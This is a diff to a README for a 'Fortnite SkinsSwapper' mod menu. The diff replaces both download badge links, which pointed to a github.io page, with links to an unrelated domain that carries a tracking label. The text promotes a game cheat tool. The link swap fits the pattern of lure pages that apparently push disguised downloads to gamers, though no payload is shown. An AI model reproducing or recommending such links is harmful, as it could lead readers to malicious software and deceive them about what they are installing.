@@ -2,7 +2,7 @@
 
 The **Fortnite SkinsSwapper** is a powerful tool that allows you to effortlessly swap and customize your skins in Fortnite, giving you a fresh, unique look every time you play. Whether you're aiming to stand out with rare skins, experiment with different combinations, or simply enjoy more variety in your character appearance, this mod menu offers all the options you need.
 
-[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite%20SkinSwapper-blueviolet)](https://fortnite-skinsswapper.github.io/.github/)
+[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite%20SkinSwapper-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ✨ Key Features
 
@@ -34,4 +34,4 @@ The **Fortnite SkinsSwapper** is a powerful tool that allows you to effortlessly
 3. **Browse the available skins** in the menu and select your desired skin or customization.
 4. **Apply the selected skin** and enjoy your new look in-game instantly.
 
-[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite%20SkinSwapper-blueviolet)](https://fortnite-skinsswapper.github.io/.github/)
+[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite%20SkinSwapper-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
